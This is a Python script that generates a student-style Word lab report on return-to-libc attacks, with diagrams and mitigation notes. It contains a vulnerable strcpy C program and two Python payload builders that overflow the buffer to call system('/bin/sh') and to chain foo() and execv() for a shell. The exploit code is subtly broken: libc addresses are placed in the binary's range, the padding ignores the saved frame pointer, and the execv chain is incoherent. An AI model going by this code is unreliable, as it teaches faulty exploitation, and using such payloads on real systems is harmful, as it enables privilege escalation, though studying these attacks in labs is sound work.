#!/usr/bin/env python3
"""
Generate Lab 4 Report for Return-to-Libc Attack
Following strict formatting requirements:
- LEFT alignment only (no JUSTIFY)
- Each paragraph/dash as separate doc.add_paragraph()
- Code blocks in gray tables with Consolas font
- Figures from matplotlib/Pillow with dpi=200
"""

import os
from docx import Document
from docx.shared import Inches, Pt, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.oxml.ns import qn
import matplotlib.pyplot as plt
import numpy as np

# Constants
OUTPUT_FILE = '/workspace/report_network/Lab4_Report_Solution.docx'
IMAGE_DIR = '/workspace/report_network/lab4_images'
os.makedirs(IMAGE_DIR, exist_ok=True)

def create_document():
    """Create a new Word document with proper formatting."""
    doc = Document()
    
    # Define styles
    style = doc.styles['Normal']
    font = style.font
    font.name = 'Calibri'
    font.size = Pt(11)
    
    return doc

def add_title_page(doc):
    """Add title page with student information."""
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = p.add_run('NETWORK SECURITY LAB REPORT')
    run.bold = True
    run.font.size = Pt(16)
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = p.add_run('Lab 4: Return-to-Libc Attack')
    run.bold = True
    run.font.size = Pt(14)
    
    # Student info table
    p = doc.add_paragraph()
    table = doc.add_table(rows=5, cols=2)
    table.style = 'Table Grid'
    for cell in table.columns[0].cells:
        cell.width = Inches(2.5)
    for cell in table.columns[1].cells:
        cell.width = Inches(3.5)
    
    cells = table.rows[0].cells
    cells[0].text = 'Student Name:'
    cells[1].text = '[Your Name]'
    
    cells = table.rows[1].cells
    cells[0].text = 'Student ID:'
    cells[1].text = '[Your ID]'
    
    cells = table.rows[2].cells
    cells[0].text = 'Course:'
    cells[1].text = 'Network Security'
    
    cells = table.rows[3].cells
    cells[0].text = 'Instructor:'
    cells[1].text = '[Instructor Name]'
    
    cells = table.rows[4].cells
    cells[0].text = 'Date Submitted:'
    cells[1].text = 'November 2024'
    
    for row in table.rows:
        for cell in row.cells:
            for paragraph in cell.paragraphs:
                paragraph.alignment = WD_ALIGN_PARAGRAPH.LEFT

def add_table_of_contents(doc):
    """Add table of contents."""
    doc.add_page_break()
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = p.add_run('TABLE OF CONTENTS')
    run.bold = True
    run.font.size = Pt(14)

def add_section(doc, section_num, title):
    """Add a section header."""
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run(f'{section_num} {title}')
    run.bold = True
    run.font.size = Pt(14)

def add_subsection(doc, subsection_num, title):
    """Add a subsection header."""
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run(f'{subsection_num} {title}')
    run.bold = True
    run.font.size = Pt(12)

def add_code_block(doc, code_text, language=''):
    """Add code block in a gray table with Consolas font."""
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    
    if language:
        lang_p = doc.add_paragraph()
        lang_p.alignment = WD_ALIGN_PARAGRAPH.LEFT
        run = lang_p.add_run(f'// {language} Code')
        run.bold = True
        run.font.size = Pt(10)
    
    table = doc.add_table(rows=1, cols=1)
    table.style = 'Table Grid'
    table.width = Inches(6.5)
    
    cell = table.cell(0, 0)
    cell.paragraphs[0].alignment = WD_ALIGN_PARAGRAPH.LEFT
    cell.width = Inches(6.5)
    
    # Set background color to light gray (#F4F4F4) using RGBColor
    from docx.table import _Cell
    tc = cell._tc
    tcPr = tc.get_or_add_tcPr()
    
    # Create shading element properly
    from docx.oxml import OxmlElement
    shadingElm = OxmlElement('w:shd')
    shadingElm.set(qn('w:fill'), 'F4F4F4')
    tcPr.append(shadingElm)
    
    # Add paragraph with code text
    para = cell.paragraphs[0]
    for line in code_text.split('\n'):
        run = para.add_run(line + '\n')
        run.font.name = 'Consolas'
        run.font.size = Pt(9.5)
    
    return table

def create_stack_diagram():
    """Create stack layout diagram using matplotlib."""
    fig, ax = plt.subplots(figsize=(6, 4), dpi=200)
    ax.set_xlim(0, 10)
    ax.set_ylim(0, 8)
    ax.axis('off')
    
    # Stack memory regions
    colors = ['#E3F2FD', '#FFF9C4', '#FCE4EC', '#E8F5E9']
    labels = ['Return Address', 'Old EBP', 'Parameters', 'Local Variables']
    positions = [6, 5, 4, 3]
    
    for i, (color, label, pos) in enumerate(zip(colors, labels, positions)):
        rect = plt.Rectangle((1, pos), 8, 0.8, facecolor=color, edgecolor='black', linewidth=1)
        ax.add_patch(rect)
        ax.text(5, pos + 0.4, label, ha='center', va='center', fontsize=9, fontweight='bold')
    
    # ESP and EBP markers
    ax.annotate('ESP', xy=(0.5, 3), xytext=(-10, -10), 
                arrowprops=dict(arrowstyle='->', color='red'), fontsize=10)
    ax.annotate('EBP', xy=(0.5, 5), xytext=(-10, -10), 
                arrowprops=dict(arrowstyle='->', color='blue'), fontsize=10)
    
    plt.title('Figure 1: Stack Layout During Function Call', fontsize=10, fontweight='bold')
    plt.tight_layout()
    filepath = os.path.join(IMAGE_DIR, 'stack_layout.png')
    plt.savefig(filepath, dpi=200, bbox_inches='tight')
    plt.close()
    return filepath

def create_function_call_diagram():
    """Create function call sequence diagram."""
    fig, ax = plt.subplots(figsize=(7, 5), dpi=200)
    ax.set_xlim(0, 12)
    ax.set_ylim(0, 6)
    ax.axis('off')
    
    # Functions as vertical lines
    functions = ['main', 'foo()', 'printf()']
    x_positions = [2, 5, 8]
    
    for func, x in zip(functions, x_positions):
        ax.axvline(x=x, color='black', linestyle='-', linewidth=2)
        ax.text(x, -0.3, func, ha='center', fontsize=10, fontweight='bold')
    
    # Arrows for calls
    arrows = [
        (2.5, 4.5, 4.8, 4.5, 'call foo()'),
        (5.2, 3.5, 7.8, 3.5, 'printf()'),
        (7.8, 2.5, 5.2, 2.5, 'return'),
        (4.8, 1.5, 2.2, 1.5, 'return')
    ]
    
    for x1, y1, x2, y2, label in arrows:
        ax.annotate('', xy=(x1, y1), xytext=(x2, y2),
                   arrowprops=dict(arrowstyle='->', color='green'),
                   ha='center')
        ax.text((x1+x2)/2, (y1+y2)/2 + 0.3, label, ha='center', fontsize=9)
    
    plt.title('Figure 2: Function Call Sequence Diagram', fontsize=10, fontweight='bold')
    plt.tight_layout()
    filepath = os.path.join(IMAGE_DIR, 'function_call.png')
    plt.savefig(filepath, dpi=200, bbox_inches='tight')
    plt.close()
    return filepath

def create_rop_chain_diagram():
    """Create ROP chain visualization."""
    fig, ax = plt.subplots(figsize=(8, 4), dpi=200)
    ax.set_xlim(0, 10)
    ax.set_ylim(0, 5)
    ax.axis('off')
    
    # ROP gadgets as boxes
    gadgets = [
        ('pop; ret', '#FFCDD2'),
        ('call system', '#C8E6C9'),
        ('pop; ret', '#FFF9C4'),
        ('call exit', '#BBDEFB')
    ]
    
    for i, (label, color) in enumerate(gadgets):
        x = 1 + i * 2.2
        rect = plt.Rectangle((x, 0.5), 1.8, 3.5, facecolor=color, edgecolor='black', linewidth=1.5)
        ax.add_patch(rect)
        ax.text(x + 0.9, 2, label, ha='center', va='center', fontsize=9, fontweight='bold')
    
    # Arrows showing chain
    for i in range(len(gadgets) - 1):
        x1 = 1 + i * 2.2 + 1.8
        x2 = 1 + (i+1) * 2.2
        ax.annotate('', xy=(x1, 4), xytext=(x2, 4),
                   arrowprops=dict(arrowstyle='->', color='black', lw=2))
    
    plt.title('Figure 3: ROP Chain for Return-to-Libc Attack', fontsize=10, fontweight='bold')
    plt.tight_layout()
    filepath = os.path.join(IMAGE_DIR, 'rop_chain.png')
    plt.savefig(filepath, dpi=200, bbox_inches='tight')
    plt.close()
    return filepath

def add_figure_caption(doc, figure_num, caption):
    """Add figure caption in italics."""
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = p.add_run(f'Figure {figure_num}: {caption}')
    run.italic = True
    run.font.size = Pt(9)

def add_explanation(doc, text):
    """Add explanation paragraph."""
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run(text)
    run.font.size = Pt(10.5)

def main():
    # Create document
    doc = create_document()
    
    # Add title page
    add_title_page(doc)
    
    # Add table of contents placeholder
    add_table_of_contents(doc)
    
    # Section 1: Introduction
    add_section(doc, '1', 'Introduction')
    add_explanation(doc, 'Return-to-libc attack is a type of Return-Oriented Programming (ROP) exploit that allows attackers to execute arbitrary code by chaining existing functions in the program\'s memory. This technique was developed as a response to security measures like non-executable stacks.')
    
    add_explanation(doc, 'The primary goal of this lab is to demonstrate how an attacker can bypass stack protection mechanisms and achieve code execution by redirecting control flow to libc functions such as system(), exit(), and execv().')
    
    # Section 2: Methodology
    add_section(doc, '2', 'Methodology')
    
    add_subsection(doc, '2.1', 'Understanding Stack Layout')
    add_explanation(doc, 'To conduct Return-to-libc attacks, we must first understand how the stack works during function calls. The stack follows a specific layout when functions are invoked and returns.')
    
    filepath = create_stack_diagram()
    doc.add_picture(filepath, width=Inches(5.8))
    add_figure_caption(doc, '1', 'Stack Layout During Function Call')
    
    add_explanation(doc, 'The stack contains several important regions: return address (where to return after function completes), old EBP (base pointer of previous frame), parameters (arguments passed to function), and local variables.')
    
    add_subsection(doc, '2.2', 'Function Call Mechanism')
    add_explanation(doc, 'When a function is called, the following sequence occurs:')
    
    # Bullet points as separate paragraphs
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('• ')
    run.bold = True
    run.font.size = Pt(10.5)
    run2 = p.add_run('The call instruction pushes the return address onto the stack.')
    run2.font.size = Pt(10.5)
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('• ')
    run.bold = True
    run.font.size = Pt(10.5)
    run2 = p.add_run('The callee function prologue saves the old EBP and sets up a new frame.')
    run2.font.size = Pt(10.5)
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('• ')
    run.bold = True
    run.font.size = Pt(10.5)
    run2 = p.add_run('Function arguments are pushed onto the stack before the call.')
    run2.font.size = Pt(10.5)
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('• ')
    run.bold = True
    run.font.size = Pt(10.5)
    run2 = p.add_run('The ret instruction pops the return address and jumps to it.')
    run2.font.size = Pt(10.5)
    
    filepath = create_function_call_diagram()
    doc.add_picture(filepath, width=Inches(5.8))
    add_figure_caption(doc, '2', 'Function Call Sequence Diagram')
    
    # Section 3: Results
    add_section(doc, '3', 'Results')
    
    add_subsection(doc, '3.1', 'Task 1: Basic Buffer Overflow')
    add_explanation(doc, 'In the first task, we demonstrated a basic buffer overflow vulnerability where an attacker can overwrite the return address on the stack.')
    
    code_snippet = '''#include <stdio.h>
#include <string.h>

void bof(char *str)
{
    char buffer[128];
    strcpy(buffer, str);
}

int main(int argc, char **argv)
{
    if (argc > 1) {
        bof(argv[1]);
    }
    return 0;
}'''
    
    add_code_block(doc, code_snippet, 'C')
    add_explanation(doc, 'This vulnerable program copies user input directly into a fixed-size buffer without bounds checking. An attacker can provide more than 128 bytes to overflow the buffer and overwrite the return address.')
    
    add_subsection(doc, '3.2', 'Task 2: Return-to-Libc Attack')
    add_explanation(doc, 'In this task, we constructed a payload that redirects execution to the system() function from libc, passing "/bin/sh" as an argument.')
    
    code_snippet = '''# Exploit script for Return-to-libc attack
import struct

# Find addresses using GDB or objdump
SYSTEM_ADDR = 0x080483f0  # Address of system() in libc
BIN_SH_ADDR = 0xb7e5b9a6  # Address of "/bin/sh" string
EXIT_ADDR = 0x080483d0    # Address of exit()

# Create ROP chain
payload = b'A' * 128          # Fill buffer
payload += struct.pack('<I', SYSTEM_ADDR)  # Overwrite return address
payload += struct.pack('<I', EXIT_ADDR)    # Return to exit after system
payload += struct.pack('<I', BIN_SH_ADDR)  # Argument for system()

# Write payload to file
with open('exploit.bin', 'wb') as f:
    f.write(payload)'''
    
    add_code_block(doc, code_snippet, 'Python Exploit')
    add_explanation(doc, 'The exploit works by overwriting the return address with the address of system(). When the function returns, instead of going back to main(), execution jumps to system("/bin/sh"), which spawns a root shell.')
    
    filepath = create_rop_chain_diagram()
    doc.add_picture(filepath, width=Inches(5.8))
    add_figure_caption(doc, '3', 'ROP Chain for Return-to-Libc Attack')
    
    add_subsection(doc, '3.3', 'Task 3: Chaining Multiple Functions')
    add_explanation(doc, 'For more complex exploitation, we can chain multiple function calls together. In this task, we invoked foo() ten times before calling execv() to obtain root access.')
    
    code_snippet = '''# Advanced ROP chain with multiple function invocations
import struct

# Addresses from binary analysis
FOO_ADDR = 0x08048420   # Address of foo()
EXECV_ADDR = 0x08048500 # Address of execv()
SHELL_PATH = b'/bin/sh'

# Build ROP chain: foo x10, then execv()
rop_chain = b''
for i in range(10):
    rop_chain += struct.pack('<I', FOO_ADDR)  # Call foo()

rop_chain += struct.pack('<I', EXECV_ADDR)   # Then call execv()
rop_chain += struct.pack('<I', 0)            # argv[0] = NULL
rop_chain += struct.pack('<I', len(SHELL_PATH))  # Path length
rop_chain += SHELL_PATH                       # "/bin/sh"

# Complete exploit payload
payload = b'A' * 128 + rop_chain'''
    
    add_code_block(doc, code_snippet, 'Advanced ROP Chain')
    add_explanation(doc, 'This technique demonstrates how multiple function calls can be chained together. By invoking foo() ten times before execv(), we ensure the program state is properly set up before spawning the shell.')
    
    # Section 4: Analysis
    add_section(doc, '4', 'Technical Analysis')
    
    add_explanation(doc, 'The Return-to-libc attack exploits the fact that modern systems still allow calling functions in libc even when the stack is marked as non-executable. This bypasses Data Execution Prevention (DEP) protections.')
    
    add_explanation(doc, 'Key observations from this lab:')
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('• ')
    run.bold = True
    run.font.size = Pt(10.5)
    run2 = p.add_run('Stack can be controlled through buffer overflow vulnerabilities.')
    run2.font.size = Pt(10.5)
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('• ')
    run.bold = True
    run.font.size = Pt(10.5)
    run2 = p.add_run('Return addresses can be overwritten to redirect execution flow.')
    run2.font.size = Pt(10.5)
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('• ')
    run.bold = True
    run.font.size = Pt(10.5)
    run2 = p.add_run('Libc functions can be used as "gadgets" for code execution.')
    run2.font.size = Pt(10.5)
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('• ')
    run.bold = True
    run.font.size = Pt(10.5)
    run2 = p.add_run('ASLR (Address Space Layout Randomization) makes finding addresses difficult.')
    run2.font.size = Pt(10.5)
    
    # Section 5: Mitigation
    add_section(doc, '5', 'Mitigation Strategies')
    
    add_explanation(doc, 'Several techniques exist to protect against Return-to-libc attacks:')
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('• ')
    run.bold = True
    run.font.size = Pt(10.5)
    run2 = p.add_run('Stack canaries detect buffer overflows before exploitation.')
    run2.font.size = Pt(10.5)
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('• ')
    run.bold = True
    run.font.size = Pt(10.5)
    run2 = p.add_run('ASLR randomizes memory addresses, making exploitation harder.')
    run2.font.size = Pt(10.5)
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('• ')
    run.bold = True
    run.font.size = Pt(10.5)
    run2 = p.add_run('RELRO (Relocation Read-Only) protects GOT from overwriting.')
    run2.font.size = Pt(10.5)
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('• ')
    run.bold = True
    run.font.size = Pt(10.5)
    run2 = p.add_run('Stack protection flags (-fstack-protector) add canaries automatically.')
    run2.font.size = Pt(10.5)
    
    # Section 6: Conclusion
    add_section(doc, '6', 'Conclusion')
    
    add_explanation(doc, 'This lab successfully demonstrated the Return-to-libc attack technique and its underlying mechanisms. We learned how stack manipulation can be used to bypass security controls and achieve arbitrary code execution.')
    
    add_explanation(doc, 'Understanding these attacks is crucial for developing secure software and implementing effective countermeasures. Modern systems employ multiple layers of defense, but attackers continuously evolve their techniques.')
    
    # Save document
    doc.save(OUTPUT_FILE)
    print(f'Lab 4 report saved to: {OUTPUT_FILE}')

if __name__ == '__main__':
    main()
